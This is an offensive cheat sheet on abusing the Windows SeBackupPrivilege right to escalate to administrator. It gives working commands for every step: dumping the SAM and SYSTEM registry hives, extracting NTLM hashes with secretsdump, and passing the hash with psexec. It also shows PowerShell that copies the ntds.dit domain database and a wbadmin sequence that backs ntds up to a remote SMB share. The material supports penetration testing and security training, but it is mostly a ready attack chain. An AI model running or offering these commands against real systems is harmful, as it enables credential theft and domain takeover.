# SeBackupPrivilege

From [gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)

| Privilege | Impact | Tool | Execution path | Remarks |
| --- | --- | --- | --- | --- |
|`SeBackup`| ***Admin*** | 3rd party tool <br><br> Sensitive files access (in combination with `SeRestore`): <br> ***Built-in commands*** | 1. Enable the privilege in the token <br><br> 2. Export the `HKLM\SAM` and `HKLM\SYSTEM` registry hives:<br> `cmd /c "reg save HKLM\SAM SAM & reg save HKLM\SYSTEM SYSTEM"` <br><br> 3. Eventually transfer the exported hives on a controlled computer <br><br> 4. Extract the local accounts hashes from the export `SAM` hive. For example using `Impacket`'s `secretsdump.py` Python script: <br> `secretsdump.py -sam SAM -system SYSTEM LOCAL` <br><br> 5. Authenticate as the local built-in `Administrator`, or another member of the local `Administrators` group, using its `NTLM` hash (Pass-the-Hash). For example using `Impacket`'s `psexec.py` Python script: <br> `psexec.py -hashes ":<ADMINISTRATOR_NTLM>" <Administrator>@<TARGET_IP>` <br><br> Alternatively, can be used to read sensitive files with `robocopy /b` | - `User Account Control` may prevent Pass-the-Hash authentications with the local accounts but by default the built-in `Administrator` (RID 500) account is not concerned (as `FilterAdministratorToken` is disabled by default). <br><br> - Pass-the-Hash authentications can be attempted over (at least) the following services: `SMB` (port TCP 445), `SMB` over `NetBIOS` (port TCP 139), `WinRM` (ports TCP 5985 / 5986), or `RDP` if the `Restricted Admin` feature is enabled server side (port TCP 3389). <br><br> - Access to sensitive files may be more interesting if you can read `%WINDIR%\MEMORY.DMP`. <br><br> - `SeBackupPrivilege` is not helpful when it comes to open and write to files as it may only be used to copy files. <br><br> - Robocopy requires both `SeBackup` and `SeRestore` to work with the `/b` parameter (which are both granted to members of the `Backup Operators` group by default). <br> Instead, [`Copy-FileSeBackupPrivilege`](https://github.com/giuliano108/SeBackupPrivilege) can be used to backup files through a process with only the `SeBackup` privilege in its token: <br> `Import-Module .\SeBackupPrivilegeUtils.dll` <br> `Import-Module .\SeBackupPrivilegeCmdLets.dll` <br> `Set-SeBackupPrivilege` <br> `Copy-FileSeBackupPrivilege <SOURCE_FILE> <DEST_FILE>` |

Referenced in the table above is [giuliano108's SeBackupPrivilege PoC](https://github.com/giuliano108/SeBackupPrivilege) *"Use SE_BACKUP_NAME/SeBackupPrivilege to access objects you shouldn't have access to"*
```powershell
PS C:\scripts> Import-Module .\SeBackupPrivilegeUtils.dll
PS C:\scripts> Import-Module .\SeBackupPrivilegeCmdLets.dll
# Set privileges that have been disabled
PS C:\scripts> Set-SeBackupPrivilege
PS C:\scripts> Get-SeBackupPrivilege
# Copy hard to reach files
Copy-FileSeBackupPrivilege .\report.pdf c:\temp\x.pdf -Overwrite
# Like
Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\windows\temp\NTDS -
Overwrite
Copy-FileSeBackupPrivilege h:\windows\system32\config\SYSTEM
c:\windows\temp\SYSTEM -Overwrite
```

If for some weird reason you can backup files to remote SMB share that is not even domain joined. 
```powershell
# Do not use impacket-smbserver as require NTFS/ReFS 

echo "Y" | wbadmin start backup -backuptarget:\\$IP\Share -include:c:\windows\ntds

wbadmin get versions

echo "Y" | wbadmin start recovery -version:$TIMEFROMVERSION -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

## References

[gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
[giuliano108's SeBackupPrivilege PoC](https://github.com/giuliano108/SeBackupPrivilege)